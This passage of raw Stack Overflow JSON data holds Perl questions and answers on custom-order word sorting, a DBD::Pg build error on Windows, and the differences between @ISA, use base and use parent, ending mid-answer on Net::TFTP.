<code>tr</code>. See <a href=\"https://perldoc.perl.org/functions/eval.html\" rel=\"nofollow noreferrer\">here</a>.  <code>tr&#47;&#47;&#47;r</code> - I must have forgotten about that possibility being concentrated on the main idea of the algorithm."}], "tags": [], "owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "is_accepted": false, "score": 1, "last_activity_date": 1521061333, "last_edit_date": 1521061333, "creation_date": 1521053962, "answer_id": 49285768, "question_id": 49285145, "link": "https://stackoverflow.com/questions/49285145/given-two-input-arrays-return-true-if-the-words-array-is-sorted-according-to-th/49285768#49285768", "title": "Given two input arrays, return true if the words array is sorted according to the ordering array?", "body": "<p>If I understand the problem and the ordering correctly then this is a cleaner and more readable solution: </p>\n\n<pre><code>sub in_order {\n  my ($words, $ordering) = @_;\n\n  my $from = join '', @$ordering;\n  my $to = pack 'C*', 0..$#$ordering;\n\n  my @remapped = eval(\"map { tr/\\Q$from\\E/\\Q$to\\E/; \\$_ } my \\@t=\\@\\$words\");\n\n  for my $i (1..$#remapped) {\n    if ($remapped[$i-1] gt $remapped[$i] ) {\n      return 0;\n    }\n  }\n  return 1\n}\n\nmy @words = ( 'cc','cb','bb','ac' );\nmy @ordering = ('c','b','a' );\n\nprintf \"words=(%s) ordering=(%s) in_order=%s\\n\"\n    , join(',', @words), join(',', @ordering)\n    , in_order(\\@words,\\@ordering) ? \"true\" : \"false\";\n\n@words = ( 'cc','cb','bb','ac' );\n@ordering = ('b','c','a' );\n\nprintf \"words=(%s) ordering=(%s) in_order=%s\\n\"\n    , join(',', @words), join(',', @ordering)\n    , in_order(\\@words,\\@ordering) ? \"true\" : \"false\";\n</code></pre>\n\n<p><strong>output</strong></p>\n\n<pre><code>words=(cc,cb,bb,ac) ordering=(c,b,a) in_order=true\nwords=(cc,cb,bb,ac) ordering=(b,c,a) in_order=false\n</code></pre>\n"}], "owner": {"reputation": 110, "user_id": 9309922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d79a5bc990752e16cf81c9ae6e4d598a?s=128&d=identicon&r=PG&f=1", "display_name": "Arnab", "link": "https://stackoverflow.com/users/9309922/arnab"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 148, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1521061333, "creation_date": 1521051811, "last_edit_date": 1521052079, "question_id": 49285145, "link": "https://stackoverflow.com/questions/49285145/given-two-input-arrays-return-true-if-the-words-array-is-sorted-according-to-th", "title": "Given two input arrays, return true if the words array is sorted according to the ordering array?", "body": "<p>Want to get a better solution for this problem ?</p>\n\n<p>Given two input arrays, return true if the words array is sorted according to the ordering array.\n example - words = ['cc', 'cb','bb','ac']\n            ordering = ['c','b','a']\n            Output: true </p>\n\n<p>example - words = ['cc', 'cb','bb','ac']\n            ordering = ['b','c','a']\n            Output: false </p>\n\n<p>I came up with the following code, in perl and its a workable solution if not super generic.</p>\n\n<pre><code># example - words = ['cc', 'cb','bb','ac']\n#           ordering = ['c','b','a']\n#           Output: true \nmy @words = ( 'cc','cb','bb','ac' );\nmy @ordering = ('c','b','a' );\nprint STDOUT \"Input \\@words=[\",join(\",\",@words),\"] and \\@ordering=[\",join(\",\",@ordering),\"] output of \\&amp;checkWordOrdering ~[\",checkWordOrdering ( \\@words, \\@ordering ),\"]\\n\";\n\n#\n# example - words = ['cc', 'cb','bb','ac']\n#           ordering = ['b','c','a']\n#           Output: false \n@words = ( 'cc','cb','bb','ac' );\n@ordering = ('b','c','a' );\nprint STDOUT \"Input \\@words=[\",join(\",\",@words),\"] and \\@ordering=[\",join(\",\",@ordering),\"] output of \\&amp;checkWordOrdering ~[\",checkWordOrdering ( \\@words, \\@ordering ),\"]\\n\";\n\n\nsub checkWordOrdering{\n        my ( $wordsRef, $orderingRef ) = @_ ;\n        my $orderedList = createOrderingList( $orderingRef ) ;\n\n        foreach  my $eachWord ( @{$wordsRef}) {\n                unless ( grep /$eachWord/, @{$orderedList} ) {\n                        return \"fasle\";\n                }\n        }\n        return \"true\";\n}\n\nsub createOrderingList {\n    my ( $orderingRef ) = @_;\n    my @OrderedList = ();\n    my $lastIndex = scalar(@{$orderingRef}) - 1;\n\n    for ( my $i=0; $i &lt;scalar(@{$orderingRef}) ; $i++){\n            my $index = $i + 1;\n            if ( $i == $lastIndex ) {\n                $index = -($i+1);\n            }\n            my $dupstr = $orderingRef-&gt;[$i].$orderingRef-&gt;[$i];\n            my $str = $orderingRef-&gt;[$i].$orderingRef-&gt;[$index];\n            push ( @OrderedList, ($dupstr,$str) );\n    }\n    #print Dumper \\@OrderedList;\n    return [@OrderedList];\n}\n</code></pre>\n\n<p><strong>Output of the above code-base is :-</strong></p>\n\n<pre><code>Input @words=[cc,cb,bb,ac] and @ordering=[c,b,a] output of &amp;checkWordOrdering ~[true]\nInput @words=[cc,cb,bb,ac] and @ordering=[b,c,a] output of &amp;checkWordOrdering ~[fasle]\n</code></pre>\n"}, {"tags": ["perl", "module", "strawberry-perl", "dbd"], "comments": [{"owner": {"reputation": 1010, "user_id": 2418001, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a85d8e000f6904783dc322a8a3eef90f?s=128&d=identicon&r=PG", "display_name": "Thanos", "link": "https://stackoverflow.com/users/2418001/thanos"}, "edited": false, "score": 0, "creation_date": 1521043196, "post_id": 49282012, "comment_id": 85567406, "body": "It looks that there is a bug on the version that you are trying to install, see here for more info (<a href=\"https://rt.cpan.org/Public/Bug/Display.html?id=122019\" rel=\"nofollow noreferrer\">rt.cpan.org/Public/Bug/Display.html?id=122019</a>). Try downloading the latest version 3.7.4 (<a href=\"http://search.cpan.org/dist/DBD-Pg/Pg.pm\" rel=\"nofollow noreferrer\">search.cpan.org/dist/DBD-Pg/Pg.pm</a>), the fix of the problem should be populated from 3.7.1 and onward."}, {"owner": {"reputation": 33, "user_id": 5415392, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sCByuePh0Gs/AAAAAAAAAAI/AAAAAAAAAEU/QdqIcC757yY/photo.jpg?sz=128", "display_name": "N. Hereman", "link": "https://stackoverflow.com/users/5415392/n-hereman"}, "reply_to_user": {"reputation": 1010, "user_id": 2418001, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a85d8e000f6904783dc322a8a3eef90f?s=128&d=identicon&r=PG", "display_name": "Thanos", "link": "https://stackoverflow.com/users/2418001/thanos"}, "edited": false, "score": 0, "creation_date": 1521099760, "post_id": 49282012, "comment_id": 85590039, "body": "@Thanos thanks for your help, but I was already installing the latest version. My problem has been solved by the patch given by daxim"}], "answers": [{"comments": [{"owner": {"reputation": 1010, "user_id": 2418001, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a85d8e000f6904783dc322a8a3eef90f?s=128&d=identicon&r=PG", "display_name": "Thanos", "link": "https://stackoverflow.com/users/2418001/thanos"}, "edited": false, "score": 0, "creation_date": 1521044223, "post_id": 49282582, "comment_id": 85568176, "body": "According to the bug report the fix is in 3.7.1 the latest version is 3.7.4 so I think the best solution is to download 3.7.4 and install. Probably the OP is trying to install an older version of 3.7.1"}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "reply_to_user": {"reputation": 1010, "user_id": 2418001, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a85d8e000f6904783dc322a8a3eef90f?s=128&d=identicon&r=PG", "display_name": "Thanos", "link": "https://stackoverflow.com/users/2418001/thanos"}, "edited": false, "score": 0, "creation_date": 1521044504, "post_id": 49282582, "comment_id": 85568384, "body": "We both \u2013 op and I \u2013 have DBD-Pg-3.7.4; you&#39;re wrong."}, {"owner": {"reputation": 1010, "user_id": 2418001, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a85d8e000f6904783dc322a8a3eef90f?s=128&d=identicon&r=PG", "display_name": "Thanos", "link": "https://stackoverflow.com/users/2418001/thanos"}, "edited": false, "score": 0, "creation_date": 1521044601, "post_id": 49282582, "comment_id": 85568453, "body": "I am not wrong, it is mentioned in the bug report (Fixed in:\t3.7.1). In case that this information is misleading this is another story."}, {"owner": {"reputation": 33, "user_id": 5415392, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sCByuePh0Gs/AAAAAAAAAAI/AAAAAAAAAEU/QdqIcC757yY/photo.jpg?sz=128", "display_name": "N. Hereman", "link": "https://stackoverflow.com/users/5415392/n-hereman"}, "edited": false, "score": 0, "creation_date": 1521099658, "post_id": 49282582, "comment_id": 85589980, "body": "Thanks for your help ! The patch solved my problem !"}], "tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": true, "score": 3, "last_activity_date": 1521043619, "creation_date": 1521043619, "answer_id": 49282582, "question_id": 49282012, "link": "https://stackoverflow.com/questions/49282012/dbdpg-compilation-error-windows-10-strawberry-perl/49282582#49282582", "title": "DBD::Pg compilation error (Windows 10 / Strawberry Perl)", "body": "<p>I can reproduce this with DBD-Pg-3.7.4. <a href=\"https://rt.cpan.org/Public/Bug/Display.html?id=122019\" rel=\"nofollow noreferrer\">It is a known bug.</a> The <a href=\"https://rt.cpan.org/Public/Bug/Display.html?id=122019#txn-1740155\" rel=\"nofollow noreferrer\">patch by kmx</a> worked for me.</p>\n"}], "owner": {"reputation": 33, "user_id": 5415392, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sCByuePh0Gs/AAAAAAAAAAI/AAAAAAAAAEU/QdqIcC757yY/photo.jpg?sz=128", "display_name": "N. Hereman", "link": "https://stackoverflow.com/users/5415392/n-hereman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 512, "favorite_count": 0, "accepted_answer_id": 49282582, "answer_count": 1, "score": 0, "last_activity_date": 1521043619, "creation_date": 1521042063, "question_id": 49282012, "link": "https://stackoverflow.com/questions/49282012/dbdpg-compilation-error-windows-10-strawberry-perl", "title": "DBD::Pg compilation error (Windows 10 / Strawberry Perl)", "body": "<p>I'm trying to install the DBD::Pg (3.7.4) module on my windows 10/Strawberry Perl, but the compilation failed</p>\n\n<p>For that I downloaded the module on metacpan and executed following command in the windows terminal: </p>\n\n<pre><code>perl Makefile.PL phrtsd_orig\n</code></pre>\n\n<p>Response:</p>\n\n<pre><code>Configuring DBD::Pg 3.7.4\nPostgreSQL version: 90603 (default port: 5432)\nPOSTGRES_HOME: (not set)\nPOSTGRES_INCLUDE: C:/STRAWB~1/c/include\nPOSTGRES_LIB: C:/STRAWB~1/c/lib\nOS: MSWin32\nMultiple copies of Driver.xst found in: C:/Strawberry/perl/site/lib/auto/DBI/ C:/Strawberry/perl/vendor/lib/auto/DBI/ at Makefile.PL line 182.\nMultiple copies of Driver.xst found in: C:/Strawberry/perl/site/lib/auto/DBI/ C:/Strawberry/perl/vendor/lib/auto/DBI/ at Makefile.PL line 285.\nUsing DBI 1.64 (for perl 5.026001 on MSWin32-x64-multi-thread) installed in C:/Strawberry/perl/site/lib/auto/DBI/\nGenerating a gmake-style Makefile\nWriting Makefile for DBD::Pg\nWriting MYMETA.yml and MYMETA.json\n</code></pre>\n\n<p>But the problem comes after the execution of the command <code>gmake</code>.\nResponse:</p>\n\n<pre><code>Skip blib\\lib/Bundle/DBD/Pg.pm (unchanged)\nSkip blib\\lib\\DBD/Pg.pm (unchanged)\nRunning Mkbootstrap for Pg ()\n\"C:\\Strawberry\\perl\\bin\\perl.exe\" -MExtUtils::Command -e chmod -- 644 \"Pg.bs\"\n\"C:\\Strawberry\\perl\\bin\\perl.exe\" -MExtUtils::Command::MM -e cp_nonempty -- Pg.bs blib\\arch\\auto\\DBD\\Pg\\Pg.bs 644\ngcc -c  -I\"C:/STRAWB~1/c/include\" -IC:\\Strawberry\\perl\\site\\lib\\auto\\DBI -s -O2 -DWIN32 -DWIN64 -DCONSERVATIVE -D__USE_MINGW_ANSI_STDIO -DPERL_TEXTMODE_SCRIPTS -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -DUSE_PERLIO -fwrapv -fno-strict-aliasing -mms-bitfields -DPGLIBVERSION=90603 -DPGDEFPORT=5432 -s -O2   -DVERSION=\\\"3.7.4\\\" -DXS_VERSION=\\\"3.7.4\\\"  \"-IC:\\STRAWB~1\\perl\\lib\\CORE\"   Pg.c\ngcc -c  -I\"C:/STRAWB~1/c/include\" -IC:\\Strawberry\\perl\\site\\lib\\auto\\DBI -s -O2 -DWIN32 -DWIN64 -DCONSERVATIVE -D__USE_MINGW_ANSI_STDIO -DPERL_TEXTMODE_SCRIPTS -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -DUSE_PERLIO -fwrapv -fno-strict-aliasing -mms-bitfields -DPGLIBVERSION=90603 -DPGDEFPORT=5432 -s -O2   -DVERSION=\\\"3.7.4\\\" -DXS_VERSION=\\\"3.7.4\\\"  \"-IC:\\STRAWB~1\\perl\\lib\\CORE\"   dbdimp.c\ngcc -c  -I\"C:/STRAWB~1/c/include\" -IC:\\Strawberry\\perl\\site\\lib\\auto\\DBI -s -O2 -DWIN32 -DWIN64 -DCONSERVATIVE -D__USE_MINGW_ANSI_STDIO -DPERL_TEXTMODE_SCRIPTS -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -DUSE_PERLIO -fwrapv -fno-strict-aliasing -mms-bitfields -DPGLIBVERSION=90603 -DPGDEFPORT=5432 -s -O2   -DVERSION=\\\"3.7.4\\\" -DXS_VERSION=\\\"3.7.4\\\"  \"-IC:\\STRAWB~1\\perl\\lib\\CORE\"   quote.c\ngcc -c  -I\"C:/STRAWB~1/c/include\" -IC:\\Strawberry\\perl\\site\\lib\\auto\\DBI -s -O2 -DWIN32 -DWIN64 -DCONSERVATIVE -D__USE_MINGW_ANSI_STDIO -DPERL_TEXTMODE_SCRIPTS -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -DUSE_PERLIO -fwrapv -fno-strict-aliasing -mms-bitfields -DPGLIBVERSION=90603 -DPGDEFPORT=5432 -s -O2   -DVERSION=\\\"3.7.4\\\" -DXS_VERSION=\\\"3.7.4\\\"  \"-IC:\\STRAWB~1\\perl\\lib\\CORE\"   types.c\ng++ Pg.def -o blib\\arch\\auto\\DBD\\Pg\\Pg.xs.dll -mdll -s -L\"C:\\STRAWB~1\\perl\\lib\\CORE\" -L\"C:\\STRAWB~1\\c\\lib\" Pg.o dbdimp.o quote.o types.o   \"C:\\STRAWB~1\\perl\\lib\\CORE\\libperl526.a\" \"C:\\STRAWB~1\\c\\lib\\libpq.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libm.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libsecur32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libmoldname.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libkernel32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libuser32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libgdi32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libwinspool.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libcomdlg32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libadvapi32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libshell32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libole32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\liboleaut32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libnetapi32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libuuid.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libws2_32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libmpr.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libwinmm.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libversion.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libodbc32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libodbccp32.a\" \"C:\\STRAWB~1\\c\\x86_64-w64-mingw32\\lib\\libcomctl32.a\" -Wl,--enable-auto-image-base\nquote.o:quote.c:(.text+0x63d): undefined reference to `__imp__snprintf.constprop.4'\ncollect2.exe: error: ld returned 1 exit status\ngmake: *** [Makefile:496: blib\\arch\\auto\\DBD\\Pg\\Pg.xs.dll] Error 1\n</code></pre>\n\n<p>In case this information can help, I have two other module installed: </p>\n\n<ul>\n<li>Switch (2.17)</li>\n<li>DBI (1.640)</li>\n</ul>\n\n<p>Thanks in advance for you help !</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 3, "creation_date": 1521036537, "post_id": 49279264, "comment_id": 85562425, "body": "For <code>use parent</code> when the class code is loaded from a different file, see its <code>-norequire</code> option."}], "answers": [{"tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": false, "score": 5, "last_activity_date": 1521037669, "creation_date": 1521037669, "answer_id": 49280299, "question_id": 49279264, "link": "https://stackoverflow.com/questions/49279264/isa-vs-use-base-vs-use-parent/49280299#49280299", "title": "@ISA vs use base vs use parent", "body": "<p>I think it would be useful to clarify a few things:</p>\n\n<h2><a href=\"http://perldoc.perl.org/perlvar.html#@ISA\" rel=\"noreferrer\"><code>@ISA</code></a></h2>\n\n<p>is for defining a package's parent classes. It does not affect how packages are loaded. You can manipulate it directly, or you can use the <a href=\"http://perldoc.perl.org/parent.html\" rel=\"noreferrer\"><code>parent</code></a> or the slightly older <a href=\"http://perldoc.perl.org/base.html\" rel=\"noreferrer\"><code>base</code></a> pragmas. The difference between manipulating <code>@ISA</code> directly and these two pragmas is that the pragmas do a little more: <code>use base qw/Foo Bar/;</code> and <code>use parent qw/Foo Bar/;</code> are both roughly similar in effect to</p>\n\n<pre><code>BEGIN {\n    require Foo;\n    require Bar;\n    push @ISA, qw(Foo Bar);\n}\n</code></pre>\n\n<p>meaning that not only do they manipulate <code>@ISA</code>, they also load the package with <a href=\"http://perldoc.perl.org/functions/require.html\" rel=\"noreferrer\"><code>require</code></a>. There is one exception, which is <code>use parent -norequire, qw/Foo Bar/;</code> - this may be useful if, as you seem to be showing, all of your packages reside in the same file. However, both pragmas do not affect how <code>require</code> operates, including where it looks, for that you need to manipulate <code>@INC</code>.</p>\n\n<h2><a href=\"http://perldoc.perl.org/perlvar.html#@INC\" rel=\"noreferrer\"><code>@INC</code></a></h2>\n\n<p>is the place that Perl's <a href=\"http://perldoc.perl.org/functions/use.html\" rel=\"noreferrer\"><code>use</code></a>, <a href=\"http://perldoc.perl.org/functions/require.html\" rel=\"noreferrer\"><code>require</code></a>, and <a href=\"http://perldoc.perl.org/functions/do.html\" rel=\"noreferrer\"><code>do</code></a> look for files (the latter with a few exceptions). There are several ways to manipulate <code>@INC</code>:</p>\n\n<ul>\n<li>From the command line: <code>perl -I/path/to/modules script.pl</code> (see <a href=\"http://perldoc.perl.org/perlrun.html\" rel=\"noreferrer\">perlrun</a>)</li>\n<li>From within each script individually: <a href=\"http://perldoc.perl.org/lib.html\" rel=\"noreferrer\"><code>use lib '/path/to/modules';</code></a>, or by direct manipulation of <code>@INC</code></li>\n<li>Using the <a href=\"http://perldoc.perl.org/perlrun.html#PERL5LIB\" rel=\"noreferrer\"><code>PERL5LIB</code></a> environment variable</li>\n<li>Globally for the Perl installation: <a href=\"http://perldoc.perl.org/perlrun.html#%2A-f%2A\" rel=\"noreferrer\"><code>sitecustomize.pl</code></a> (only when <a href=\"https://perl5.git.perl.org/perl.git/blob/60dfa515ef5:/INSTALL#l774\" rel=\"noreferrer\">configured</a>)</li>\n<li>When building a new Perl, there are <a href=\"https://perl5.git.perl.org/perl.git/blob/60dfa515ef5:/INSTALL\" rel=\"noreferrer\">various options</a> (search for \"@INC\")</li>\n</ul>\n\n<p>Perl looks through <code>@INC</code> in order. So in your case, if Perl is loading the wrong version of <code>Log::Logger</code>, that means that Perl finds it earlier in <code>@INC</code> than the version you actually wanted to load. I would recommend inspecting <code>@INC</code> and making sure that you only include those paths from which you actually want to load modules, or placing the path for the \"development\" version of <code>Log::Logger</code> earlier in <code>@INC</code>. For example, when I develop modules, I usually specify the directory for the development version on the command line with e.g. <code>perl -Ilib ...</code>.</p>\n\n<p>Note that there was a change as of Perl 5.26: <a href=\"http://perldoc.perl.org/perl5260delta.html#Removal-of-the-current-directory-(&quot;.&quot;)-from-@INC\" rel=\"noreferrer\">the current directory <code>.</code> was removed as a default entry in <code>@INC</code></a>. (Perl 5.24.1 <a href=\"http://perldoc.perl.org/perl5241delta.html#Core-modules-and-tools-no-longer-search-_&quot;.&quot;_-for-optional-modules\" rel=\"noreferrer\">also introduced</a> some related changes.)</p>\n\n<h2><a href=\"http://perldoc.perl.org/perlvar.html#%INC\" rel=\"noreferrer\"><code>%INC</code></a></h2>\n\n<p>basically just keeps track of which modules have already been loaded, so that <code>require</code> and <code>use</code> don't load the same module twice. While it is possible to trick <code>require</code> into not looking for a file by adding its entry to <code>%INC</code> manually, there are usually better solutions than this.</p>\n"}, {"tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": true, "score": 6, "last_activity_date": 1521051330, "last_edit_date": 1521051330, "creation_date": 1521040414, "answer_id": 49281386, "question_id": 49279264, "link": "https://stackoverflow.com/questions/49279264/isa-vs-use-base-vs-use-parent/49281386#49281386", "title": "@ISA vs use base vs use parent", "body": "<p><code>parent</code> requires you to explicitly say whether you want it to actually load the parent module or just set up inheritance.  This is a strength, not a weakness; <code>base</code> had the weakness of always <em>trying</em> to load the module, leading to the problem you had.</p>\n\n<p>Do:</p>\n\n<pre><code>use parent -norequire =&gt; 'Log::Logger';\n...\nuse parent -norequire =&gt; 'Log::FileLogger';\n</code></pre>\n\n<p>etc.</p>\n\n<p>That said, the problem <code>base</code> had wouldn't have happened if you consistently used <code>use</code> or <code>require</code> to load your module; if you just run a module (e.g. <code>perl Foo/Bar.pm</code>) or otherwise load it (<code>use Test::Log::Logger</code> instead of <code>use lib 'Test'; use Log::Logger</code>??) and your code also tries to <code>use</code> it, you always risk multiple versions being found.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1521066861, "last_edit_date": 1521066861, "creation_date": 1521041615, "answer_id": 49281833, "question_id": 49279264, "link": "https://stackoverflow.com/questions/49279264/isa-vs-use-base-vs-use-parent/49281833#49281833", "title": "@ISA vs use base vs use parent", "body": "<p>I suggest you place each module in a separate file. To inline a module such that you can use <code>use Module</code>, you get the best results by replacing</p>\n\n<pre><code>use Log::Logger;\n</code></pre>\n\n<p>with</p>\n\n<pre><code>BEGIN {\n   package Log::Logger;\n   ...\n\n   $INC{\"Log/Logger.pm\"} = 1;\n}\n\nBEGIN { import Log::Logger; }\n</code></pre>\n\n<p>Then, future use of <code>use Log::Logger;</code> (including <code>use base 'Log::Logger';</code> and <code>use parent 'Log::Logger';</code>) will work properly, including exporting.</p>\n\n<p>In this particular case, @ysth's solution is adequate. I recommend moving away from base.pm in any case.</p>\n"}], "owner": {"reputation": 1225, "user_id": 1130401, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/f4bd20c5f7b3291fec720097cbcaa811?s=128&d=identicon&r=PG&f=1", "display_name": "mswanberg", "link": "https://stackoverflow.com/users/1130401/mswanberg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1140, "favorite_count": 1, "accepted_answer_id": 49281386, "answer_count": 3, "score": 2, "last_activity_date": 1521066861, "creation_date": 1521034811, "last_edit_date": 1521047878, "question_id": 49279264, "link": "https://stackoverflow.com/questions/49279264/isa-vs-use-base-vs-use-parent", "title": "@ISA vs use base vs use parent", "body": "<p>Ran across this little nugget... I think I have it figured out, but see if anyone can shed more light.</p>\n\n<p>I have a module in my <code>PERL5LIB</code> environment variable that I use for logging.  It is in <code>e:/Scripts/Log/Logger.pm</code>. Following is an excerpt:</p>\n\n<pre><code>package Log::Logger;\n...\n\npackage Log::NullLogger;\nuse base 'Log::Logger';\n...\n\npackage Log::FileLogger;\nuse base 'Log::Logger';\n...\n\npackage Log::DateFileLogger;\nuse base 'Log::FileLogger';\n...\n\npackage LogTester;\nuse Data::Dump 'dump';\ntest() unless caller();\nsub test {\n    warn dump \\%INC;\n    ...\n}\n</code></pre>\n\n<p>I wanted to make some changes to this module so I copied it to <code>e:/Test/Log/Log/Logger.pm</code> and started making changes and testing... I added a new class and altered an inherited routine in the <code>Log::Logger</code> package...</p>\n\n<pre><code>package BasicFormatter;\n...\n</code></pre>\n\n<p>But my tests were very odd.  Some of the new code was being used, some was not.  The dump of <code>%INC</code> had:</p>\n\n<pre><code>\"Log/Logger.pm\" =&gt; \"e:/Scripts/Log/Logger.pm\"\n</code></pre>\n\n<p>... the <em>old module</em>!  From what I can tell, <code>use base 'Log::Logger'</code> went out and re-loaded <code>Log/Logger.pm</code> from <code>PERL5LIB</code>, replacing only those packages in it (i.e. <code>package BasicFormatter</code> was coming from the new module, but all other packages were from the old module).</p>\n\n<p>I read about <code>use parent</code> and when I replaced my <code>use base</code> with <code>use parent</code> I got compile errors on <code>use parent 'Log::FileLogger'</code> ostensibly because there was no <code>Log/FileLogger.pm</code> module.  <code>use base</code> never complained about this -- a weakness in <code>use parent</code> in my opinion.</p>\n\n<p>I added</p>\n\n<pre><code>use lib '..';\n</code></pre>\n\n<p>to the top of the module and everything worked with <code>use base</code> but that was not a fix I like, because it would not be in the final module when I \"publish\" it back to <code>e:/Scripts/Log/Logger.pm</code>.  With the <code>use lib '..'</code>, <code>%INC</code> now showed</p>\n\n<pre><code>\"Log/Logger.pm\" =&gt; \"../Log/Logger.pm\"\n</code></pre>\n\n<p>which makes sense.</p>\n\n<p>My next step was to remove the <code>use lib '..'</code> and replace all <code>use base...</code> with <code>our @ISA=(...)</code>.  When I did this, the code started working and <code>%INC</code> didn't show an entry for <code>Log/Logger.pm</code> at all.</p>\n\n<p>Note, when I set up a test script in <code>e:/Test/Log/TestLogger.pl</code> with</p>\n\n<pre><code>use lib '.';\n</code></pre>\n\n<p>in it, it picks up <code>e:/Test/Log/Log/Logger.pm</code> fine and the <code>use base</code> calls don't re-require the package.</p>\n\n<p>So, my conclusion is this... when running the module as a modulino, the module isn't \"loaded\" as far as Perl is concerned.  So the first attempt to <code>use base</code> on that module does a <code>require &lt;module&gt;</code> which then loads it from the <code>@INC</code> path, which could replace packages already in the modulino being executed.  Using <code>@ISA</code> instead bypasses the calls to <code>require</code> and so the module isn't loaded from <code>@INC</code>.</p>\n\n<p>Anyone else got more information on this... is testing a module as a modulino just a bad idea?</p>\n"}, {"tags": ["perl", "tftp"], "comments": [{"owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "edited": false, "score": 1, "creation_date": 1521036127, "post_id": 49278821, "comment_id": 85562108, "body": "You should <a href=\"https://stackoverflow.com/posts/49278821/edit\">edit</a> your question to explain what the result of using your code is, and how it differs from what you want to achieve."}], "answers": [{"tags": [], "owner": {"reputation": 1010, "user_id": 2418001, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a85d8e000f6904783dc322a8a3eef90f?s=128&d=identicon&r=PG", "display_name": "Thanos", "link": "https://stackoverflow.com/users/2418001/thanos"}, "is_accepted": false, "score": 0, "last_activity_date": 1521051553, "creation_date": 1521051553, "answer_id": 49285074, "question_id": 49278821, "link": "https://stackoverflow.com/questions/49278821/get-file-with-nettftp-in-perl/49285074#49285074", "title": "Get file with Net::TFTP in Perl", "body": "<p>Your question or desired output is not clear to me. From what I understand 